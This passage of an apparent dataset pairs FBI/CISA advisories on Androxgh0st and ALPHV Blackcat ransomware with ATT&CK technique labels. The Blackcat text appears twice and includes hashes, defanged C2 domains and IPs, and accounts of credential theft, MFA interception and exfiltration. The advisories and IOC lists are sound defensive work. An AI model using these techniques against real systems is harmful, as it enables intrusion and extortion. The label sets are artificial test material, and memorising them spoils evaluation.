The FBI and CISA recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI and CISA recommend that software manufacturers incorporate secure by design principles and tactics into their software development practices, limiting the impact of actor techniques and strengthening their customers’ security posture. For more information on secure by design, see CISA’s Secure by Design webpage.
The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by actors using Androxgh0st malware.

Keep all operating systems, software, and firmware up to date. Specifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.
Verify that the default configuration for all URIs is to deny all requests unless there is a specific need for it to be accessible.
Ensure that any live Laravel applications are not in “debug” or testing mode. Remove all cloud credentials from .env files and revoke them. All cloud providers have safer ways to provide temporary, frequently rotated credentials to code running inside a web server without storing them in any file.
On a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the .env file for unauthorized access or use.
Scan the server’s file system for unrecognized PHP files, particularly in the root directory or /vendor/phpunit/phpunit/src/Util/PHP folder.
Review outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc., particularly when the request accesses a .php file.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-10).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI encourages organizations to report information concerning suspicious or criminal activity to their local FBI field office. With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation.
When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Reports can be submitted to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
RESOURCES

CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
NIST: CVE-2017-9841
NIST: CVE-2018-15133
NIST: CVE-2021-41773
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design

REFERENCES

Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild

ACKNOWLEDGEMENTS
Amazon contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.
VERSION HISTORY
January 16, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1071', 'T1594', 'T1083', 'T1553', 'T1583', 'T1530', 'T1593', 'T1102', 'T1587', 'T1571', 'T1213', 'T1573']","{'T1071.003', 'T1098.001', 'T1611', 'T1046', 'T1595.002', 'T1102', 'T1105', 'T1589.002', 'T1203', 'T1562.002', 'T1583.003', 'T1584', 'T1552.001', 'T1070.004', 'T1608.005', 'T1083', 'T1597.001', 'T1071.001', 'T1530', 'T1595.003', 'T1550.004', 'T1190', 'T1600.001', 'T1078', 'T1608.001', 'T1505.003', 'T1555.006', 'T1584.002'}","{'T1071.003', 'T1588.002', 'T1589', 'T1584.001', 'T1611', 'T1098.001', 'T1005', 'T1046', 'T1595.002', 'T1016', 'T1082', 'T1102', 'T1622', 'T1222.001', 'T1105', 'T1589.002', 'T1203', 'T1027', 'T1562.002', 'T1583.003', 'T1580', 'T1552.001', 'T1480.001', 'T1070.004', 'T1608.005', 'T1083', 'T1597.001', 'T1071.001', 'T1595.003', 'T1550.004', 'T1190', 'T1591', 'T1070.002', 'T1600.001', 'T1078', 'T1552.006', 'T1505.003', 'T1608.001', 'T1562', 'T1555.006', 'T1518.001'}","{'T1070', 'T1589', 'T1005', 'T0868', 'T1105, T1071', 'T1583, T1584, T1071', 'T1578', 'T1583', 'T1071, T1102', 'T1552', 'T1531', 'T1587, T1588, T1203', 'T1589, T1071, T1505', 'T1006', 'T1105', 'T1059', 'T1071, T1070, T1003, T1059', 'T1016, T1082', 'T1203, T1105, T1059', 'T1203', 'T1589, T1203, T1059', 'T1069', 'T1071', 'T1083', 'T1600', 'T1584, T1587, T1203, T1071', 'T1556', 'T1190', 'T1078', 'T1562', 'T1098, T1078', 'T1213', 'T1003'}"
5,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a,"






Actions to take today to mitigate against the threat of ransomware:




Routinely take inventory of assets and data to identify authorized and unauthorized devices and software.
Prioritize remediation of known exploited vulnerabilities.
Enable and enforce multifactor authentication with strong passwords.
Close unused ports and remove applications not deemed necessary for day-to-day operations.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known IOCs and TTPs associated with the ALPHV Blackcat ransomware as a service (RaaS) identified through FBI investigations as recently as February 2024.
This advisory provides updates to the FBI FLASH BlackCat/ALPHV Ransomware Indicators of Compromise released April 19, 2022, and to this advisory released December 19, 2023. ALPHV Blackcat actors have since employed improvised communication methods by creating victim-specific emails to notify of the initial compromise. Since mid-December 2023, of the nearly 70 leaked victims, the healthcare sector has been the most commonly victimized. This is likely in response to the ALPHV Blackcat administrator’s post encouraging its affiliates to target hospitals after operational action against the group and its infrastructure in early December 2023.
FBI, CISA, and HHS encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ALPHV Blackcat ransomware and data extortion incidents.
In February 2023, ALPHV Blackcat administrators announced the ALPHV Blackcat Ransomware 2.0 Sphynx update, which was rewritten to provide additional features to affiliates, such as better defense evasion and additional tooling. This ALPHV Blackcat update has the capability to encrypt both Windows and Linux devices, and VMWare instances. ALPHV Blackcat affiliates have extensive networks and experience with ransomware and data extortion operations.
Download the PDF version of this report:


AA23-353A #StopRansomware: ALPHV Blackcat (Update)
(PDF,       578.24 KB
  )


For a downloadable copy of IOCs, see:


AA23-353A STIX XML
(XML,       46.14 KB
  )




AA23-353A STIX JSON
(JSON,       32.93 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
ALPHV Blackcat affiliates use advanced social engineering techniques and open source research on a company to gain initial access. Actors pose as company IT and/or helpdesk staff and use phone calls or SMS messages [T1598] to obtain credentials from employees to access the target network [T1586]. ALPHV Blackcat affiliates use uniform resource locators (URLs) to live-chat with victims to convey demands and initiate processes to restore the victims’ encrypted files.
After gaining access to a victim network, ALPHV Blackcat affiliates deploy remote access software such as AnyDesk, Mega sync, and Splashtop in preparation of data exfiltration. ALPHV Blackcat affiliates create a user account, “aadmin,” and use Kerberos token generation for domain access [T1558]. After gaining access to networks, they use legitimate remote access and tunneling tools, such as Plink and Ngrok [S0508]. ALPHV Blackcat affiliates claim to use Brute Ratel C4 [S1063] and Cobalt Strike [S1054] as beacons to command and control servers. ALPHV Blackcat affiliates use the open source adversary-in-the-middle attack [T1557] framework Evilginx2, which allows them to obtain multifactor authentication (MFA) credentials, login credentials, and session cookies. The actors also obtain passwords from the domain controller, local network, and deleted backup servers to move laterally throughout the network [T1555].
To evade detection, affiliates employ allowlisted applications such as Metasploit. Once installed on the domain controller, the logs are cleared on the exchange server. Then Mega.nz or Dropbox are used to move, exfiltrate, and/or download victim data. The ransomware is then deployed, and the ransom note is embedded as a file.txt. According to public reporting, affiliates have additionally used POORTRY and STONESTOP to terminate security processes.
Some ALPHV Blackcat affiliates exfiltrate data after gaining access and extort victims without deploying ransomware. After exfiltrating and/or encrypting data, ALPHV Blackcat affiliates communicate with victims via TOR [S0183], Tox, email, or encrypted applications. The threat actors then delete victim data from the victim’s system.
ALPHV Blackcat affiliates offer to provide unsolicited cyber remediation advice as an incentive for payment, offering to provide victims with “vulnerability reports” and “security recommendations” detailing how they penetrated the system and how to prevent future re-victimization upon receipt of ransom payment. The ALPHV Blackcat encryptor results in a file with the following naming convention: RECOVER-(seven-digit extension) FILES.txt.

 

Figure 1: Ransom Note Instruction

INDICATORS OF COMPROMISE (IOCs)

Table 1: MD5 Hashes


MD5
Description
File Name




944153fb9692634d6c70899b83676575
ALPHV Windows Encryptor
 


341d43d4d5c2e526cadd88ae8da70c1c
Anti Virus Tools Killer
363.sys


34aac5719824e5f13b80d6fe23cbfa07
CobaltStrike BEACON
LMtool.exe


eea9ab1f36394769d65909f6ae81834b
CobaltStrike BEACON
Info.exe


379bf8c60b091974f856f08475a03b04
ALPHV Linux Encryptor
him


ebca4398e949286cb7f7f6c68c28e838
SimpleHelp Remote Management tool
first.exe


c04c386b945ccc04627d1a885b500edf
Tunneler Tool
conhost.exe


824d0e31fd08220a25c06baee1044818
Anti Virus Tools Killer
ibmModule.dll


eea9ab1f36394769d65909f6ae81834b
CobaltStrike BEACON
ConnectivityDiagnos.exe


944153fb9692634d6c70899b83676575
ALPHV Windows Encryptor
7O3cCX9YcHMV2.exe


61804a029e9b1753d58a6bf0274c25a6
MeshCentral Agent
WPEHOSTSVC64.exe


83deea3b61b6a734e7e4a566dbb6bffa
ScreenConnect & attacker tools installer
deployService.exe


8738b8637a20fa65c6e64d84d1cfe570
Suspected Proxy Tool
socks32.exe




Table 2: SHA256 Hashes


SHA256
Description




c64300cf8bacc4e42e74715edf3f8c3287a780c9c0a38b0d9675d01e7e231f16
ALPHV Windows Encryptor


1f5e4e2c78451623cfbf32cf517a92253b7abfe0243297c5ddf7dd1448e460d5
Anti Virus Tools Killer


3670dd4663adca40f168f3450fa9e7e84bc1a612d78830004020b73bd40fcd71
CobaltStrike BEACON


af28b78c64a9effe3de0e5ccc778527428953837948d913d64dbd0fa45942021
CobaltStrike BEACON


bbfe7289de6ab1f374d0bcbeecf31cad2333b0928ea883ca13b9e733b58e27b1
ALPHV Linux Encryptor


5d1df950b238825a36fa6204d1a2935a5fbcfe2a5991a7fc69c74f476df67905
SimpleHelp Remote Management tool


bd9edc3bf3d45e3cdf5236e8f8cd57a95ca3b41f61e4cd5c6c0404a83519058e
Tunneler Tool


732e24cb5d7ab558effc6dc88854f756016352c923ff5155dcb2eece35c19bc0
Anti Virus Tools Killer




Table 3: SHA1 Hashes


SHA1
Description




3dd0f674526f30729bced4271e6b7eb0bb890c52
ALPHV Windows Encryptor


d6d442e8b3b0aef856ac86391e4a57bcb93c19ad
Anti Virus Tools Killer


6b52543e4097f7c39cc913d55c0044fcf673f6fc
CobaltStrike BEACON


004ba0454feb2c4033ff0bdb2ff67388af0c41b6
CobaltStrike BEACON


430bd437162d4c60227288fa6a82cde8a5f87100
SimpleHelp Remote Management tool


1376ac8b5a126bb163423948bd1c7f861b4bfe32
Tunneler Tool


380f941f8047904607210add4c6da2da8f8cd398
Anti Virus Tools Killer




Table 4: Network Indicators


Indicator Type
Network Indicator
Description




Domain
resources.docusong[.]com
Command and Control Server


Domain
Fisa99.screenconnect[.]com
ScreenConnect Remote Access


IP Address
5.199.168.24
Command and Control Server


IP Address
91.92.254.193
SimpleHelp Remote Access


Domain
pcrendal[.]com
Command and Control Server


Domain
instance-qqemas-relay[.]screenconnect[.]com
ScreenConnect Remote Access


Domain
instance-rbjvws-relay.screenconnect[.]com
ScreenConnect Remote Access


IP Address
5.199.168[.]233
IP Address used by Threat Actor


IP Address
92.223.89[.]55
IP Address used by Threat Actor


IP Address
185.195.59[.]218
IP Address used by Threat Actor


IP Address
51.159.103[.]112
IP Address used by Threat Actor


IP Address
45.32.141[.]168
Command and Control Server


IP Address
45.77.0[.]92
Command and Control Server



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 7 for all referenced threat actor tactics and techniques in this advisory.

Table 5: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques - Reconnaissance


Technique Title
ID
Use




Phishing for Information
T1598
ALPHV Blackcat affiliates pose as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees to access the target network.




Table 6: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques – Resource Development


Technique Title
ID
Use




Compromise Accounts
T1586
ALPHV Blackcat affiliates use compromised accounts to gain access to victims’ networks.




Table 7: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques – Credential Access


Technique Title
ID
Use




Obtain Credentials from Passwords Stores
T1555
ALPHV Blackcat affiliates obtain passwords from local networks, deleted servers, and domain controllers.


Steal or Force Kerberos Tickets
T1558
ALPHV Blackcat/ALPHV affiliates use Kerberos token generation for domain access.


Adversary-in-the-Middle
T1557
ALPHV Blackcat/ALPHV affiliates use the open-source framework Evilginx2 to obtain MFA credentials, login credentials, and session cookies for targeted networks.



INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise or phishing incident to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722).
To report spoofing or phishing attempts (or to report that you’ve been a victim), file a complaint with the FBI’s Internet Crime Complaint Center (IC3), or contact your local FBI Field Office to report an incident.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and HHS recommend that software manufactures incorporate secure by design principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the security posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
FBI, CISA, and HHS recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity and to reduce the risk of compromise by ALPHV Blackcat threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. Due to the threat ALPHV Blackcat’s poses in the healthcare sector, healthcare organizations can look to the Healthcare and Public Health (HPH) Sector Cybersecurity Performance Goals to implement cybersecurity protections against the most common threats. tactics, techniques, and procedures used against this sector.

Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Applying recommendations in CISA's joint Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public key Infrastructure (PKI)-based MFA [CPG 2.H][HPH CPG – Multifactor Authentication]. These MFA implementations are resistant to phishing and not susceptible to push bombing or SIM swap attacks, which are techniques known be used by ALPHV Blackcat affiliates. See CISA’s Fact Sheet Implementing Phishing-Resistant MFA for more information.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic [CPG 5.1][HPH CPG – Detect and Respond to Relevant Threats and Tactics, Techniques and Procedures], including lateral movement activity on a network. Endpoint detection and response (EDR) tools are useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Implement user training on social engineering and phishing attacks [CPG 2.I][HPH CPG – Basic Cybersecurity Training]. Regularly educate users on identifying suspicious emails and links, not interacting with those suspicious items, and the importance of reporting instances of opening suspicious emails, links, attachments, or other potential lures.
Implement internal mail and messaging monitoring. Monitoring internal mail and messaging traffic to identify suspicious activity is essential as users may be phished from outside the targeted network or without the knowledge of the organizational security team. Establish a baseline of normal network traffic and scrutinize any deviations.
Implement free security tools to prevent cyber threat actors from redirecting users to malicious websites to steal their credentials. For more information see, CISA’s Free Cybersecurity Services and Tools webpage.
Install and maintain antivirus software. Antivirus software recognizes malware and protects your computer against it. Installing antivirus software from a reputable vendor is an important step in preventing and detecting infections. Always visit vendor sites directly rather than clicking on advertisements or email links. Because attackers are continually creating new viruses and other forms of malicious code, it is important to keep your antivirus software up to date.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to reduce the risk of a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
Health and Human Services HPH Cybersecurity Gateway hosts the HPH CPGs and links to HHS cybersecurity resources.

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and HHS.
VERSION HISTORY
December 19, 2023: Initial version.February 27, 2024: Update.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1586', 'T1598', 'T1557', 'T1558', 'T1555'}","






Actions to take today to mitigate against the threat of ransomware:




Routinely take inventory of assets and data to identify authorized and unauthorized devices and software.
Prioritize remediation of known exploited vulnerabilities.
Enable and enforce multifactor authentication with strong passwords.
Close unused ports and remove applications not deemed necessary for day-to-day operations.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known IOCs and TTPs associated with the ALPHV Blackcat ransomware as a service (RaaS) identified through FBI investigations as recently as February 2024.
This advisory provides updates to the FBI FLASH BlackCat/ALPHV Ransomware Indicators of Compromise released April 19, 2022, and to this advisory released December 19, 2023. ALPHV Blackcat actors have since employed improvised communication methods by creating victim-specific emails to notify of the initial compromise. Since mid-December 2023, of the nearly 70 leaked victims, the healthcare sector has been the most commonly victimized. This is likely in response to the ALPHV Blackcat administrator’s post encouraging its affiliates to target hospitals after operational action against the group and its infrastructure in early December 2023.
FBI, CISA, and HHS encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ALPHV Blackcat ransomware and data extortion incidents.
In February 2023, ALPHV Blackcat administrators announced the ALPHV Blackcat Ransomware 2.0 Sphynx update, which was rewritten to provide additional features to affiliates, such as better defense evasion and additional tooling. This ALPHV Blackcat update has the capability to encrypt both Windows and Linux devices, and VMWare instances. ALPHV Blackcat affiliates have extensive networks and experience with ransomware and data extortion operations.
Download the PDF version of this report:


AA23-353A #StopRansomware: ALPHV Blackcat (Update)
(PDF,       578.24 KB
  )


For a downloadable copy of IOCs, see:


AA23-353A STIX XML
(XML,       46.14 KB
  )




AA23-353A STIX JSON
(JSON,       32.93 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
ALPHV Blackcat affiliates use advanced social engineering techniques and open source research on a company to gain initial access. Actors pose as company IT and/or helpdesk staff and use phone calls or SMS messages, to obtain credentials from employees to access the target network,. ALPHV Blackcat affiliates use uniform resource locators (URLs) to live-chat with victims to convey demands and initiate processes to restore the victims’ encrypted files.
After gaining access to a victim network, ALPHV Blackcat affiliates deploy remote access software such as AnyDesk, Mega sync, and Splashtop in preparation of data exfiltration. ALPHV Blackcat affiliates create a user account, “aadmin,” and use Kerberos token generation for domain access,. After gaining access to networks, they use legitimate remote access and tunneling tools, such as Plink and Ngrok,S0508,. ALPHV Blackcat affiliates claim to use Brute Ratel C4,S1063, and Cobalt Strike,S1054, as beacons to command and control servers. ALPHV Blackcat affiliates use the open source adversary-in-the-middle attack, framework Evilginx2, which allows them to obtain multifactor authentication (MFA) credentials, login credentials, and session cookies. The actors also obtain passwords from the domain controller, local network, and deleted backup servers to move laterally throughout the network,.
To evade detection, affiliates employ allowlisted applications such as Metasploit. Once installed on the domain controller, the logs are cleared on the exchange server. Then Mega.nz or Dropbox are used to move, exfiltrate, and/or download victim data. The ransomware is then deployed, and the ransom note is embedded as a file.txt. According to public reporting, affiliates have additionally used POORTRY and STONESTOP to terminate security processes.
Some ALPHV Blackcat affiliates exfiltrate data after gaining access and extort victims without deploying ransomware. After exfiltrating and/or encrypting data, ALPHV Blackcat affiliates communicate with victims via TOR,S0183, Tox, email, or encrypted applications. The threat actors then delete victim data from the victim’s system.
ALPHV Blackcat affiliates offer to provide unsolicited cyber remediation advice as an incentive for payment, offering to provide victims with “vulnerability reports” and “security recommendations” detailing how they penetrated the system and how to prevent future re-victimization upon receipt of ransom payment. The ALPHV Blackcat encryptor results in a file with the following naming convention: RECOVER-(seven-digit extension) FILES.txt.

 

Figure 1: Ransom Note Instruction

INDICATORS OF COMPROMISE (IOCs)




MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 7 for all referenced threat actor tactics and techniques in this advisory.



INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise or phishing incident to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722).
To report spoofing or phishing attempts (or to report that you’ve been a victim), file a complaint with the FBI’s Internet Crime Complaint Center (IC3), or contact your local FBI Field Office to report an incident.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and HHS recommend that software manufactures incorporate secure by design principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the security posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
FBI, CISA, and HHS recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity and to reduce the risk of compromise by ALPHV Blackcat threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. Due to the threat ALPHV Blackcat’s poses in the healthcare sector, healthcare organizations can look to the Healthcare and Public Health (HPH) Sector Cybersecurity Performance Goals to implement cybersecurity protections against the most common threats. tactics, techniques, and procedures used against this sector.

Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Applying recommendations in CISA's joint Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public key Infrastructure (PKI)-based MFA,CPG 2.H,HPH CPG – Multifactor Authentication,. These MFA implementations are resistant to phishing and not susceptible to push bombing or SIM swap attacks, which are techniques known be used by ALPHV Blackcat affiliates. See CISA’s Fact Sheet Implementing Phishing-Resistant MFA for more information.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic,CPG 5.1,HPH CPG – Detect and Respond to Relevant Threats and Tactics, Techniques and Procedures, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Implement user training on social engineering and phishing attacks,CPG 2.I,HPH CPG – Basic Cybersecurity Training,. Regularly educate users on identifying suspicious emails and links, not interacting with those suspicious items, and the importance of reporting instances of opening suspicious emails, links, attachments, or other potential lures.
Implement internal mail and messaging monitoring. Monitoring internal mail and messaging traffic to identify suspicious activity is essential as users may be phished from outside the targeted network or without the knowledge of the organizational security team. Establish a baseline of normal network traffic and scrutinize any deviations.
Implement free security tools to prevent cyber threat actors from redirecting users to malicious websites to steal their credentials. For more information see, CISA’s Free Cybersecurity Services and Tools webpage.
Install and maintain antivirus software. Antivirus software recognizes malware and protects your computer against it. Installing antivirus software from a reputable vendor is an important step in preventing and detecting infections. Always visit vendor sites directly rather than clicking on advertisements or email links. Because attackers are continually creating new viruses and other forms of malicious code, it is important to keep your antivirus software up to date.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to reduce the risk of a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
Health and Human Services HPH Cybersecurity Gateway hosts the HPH CPGs and links to HHS cybersecurity resources.

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and HHS.
VERSION HISTORY
December 19, 2023: Initial version.February 27, 2024: Update.






This product is provided subject to this Notification and this Privacy & Use policy.


